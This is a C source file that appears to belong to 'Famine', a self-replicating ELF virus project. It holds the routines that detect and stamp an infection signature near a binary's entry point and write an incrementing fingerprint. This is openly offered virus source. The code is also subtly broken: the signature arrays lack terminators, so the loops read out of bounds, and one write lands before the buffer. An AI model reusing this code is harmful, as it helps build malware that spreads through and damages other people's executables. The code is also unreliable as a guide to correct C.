#include "../inc/famine.h"

static char	*ft_find_str(const char *haystack, size_t n)
{
	unsigned int	i;
	unsigned int	j;
	unsigned int	k;
    const char needle[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};

	i = 0;
    write(1,&needle[0],14); 
	if (!needle[0])
		return ((char *)haystack);
	while (n--)
	{
		j = i;
		k = 0;
		while (haystack[j] == needle[k])
		{
			j++;
			k++;
			if (!needle[k])
				return ((char *)&haystack[i]);
		}
		i++;
	}
	return (NULL);
}

bool    is_infected_general(char *path_file, t_file *file)
{
    if(open_map(path_file, file))
        return ((file->error = 1) - 1);
    if(ft_find_str(file->data, file->size))
        return(1);
    return(0);
}

bool	is_infected(char *data)
{
	Elf64_Ehdr          *header;
	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
	int i;

	i = 0;
	header = (Elf64_Ehdr *)data;
	// header->e_entry - 8; // fingerprint
	// header->e_entry - 62; // start signature
	while(sig[i])
	{
		if (sig[i] !=  *((char *)(header->e_entry - SIZE_BEFORE_ENTRY_POINT + i)))
			return(0);
		i++;
	}
	return(1);
}

bool	im_infected(char *data)
{
	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
	int i;

	i = 0;
	// header->e_entry - 8; // fingerprint
	// header->e_entry - 62; // start signature
	while(sig[i])
	{
		if (sig[i] !=  *((char *)(data - SIZE_BEFORE_ENTRY_POINT + i)))
			return(0);
		i++;
	}
	return(1);
}

void	put_sig(char *data)
{
	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
	char fingerprint[] = {'0','0','0','0','0','0','0','0'};
	int i;

	i = 0;
	*(long long *)fingerprint = *(long long *)&main - SIZE_BEFORE_ENTRY_POINT + 54;

	while(sig[i])
	{
		data[i] = sig[i]; 
		i++;
	}
	i = 7;
	while(i >= 0)
	{
		if(fingerprint[i] == '9')
			fingerprint[i] = '0';
		else
			fingerprint[i]++;
		i--;
	}
	*(long long*)&(data[i]) = *(long long *)fingerprint;
}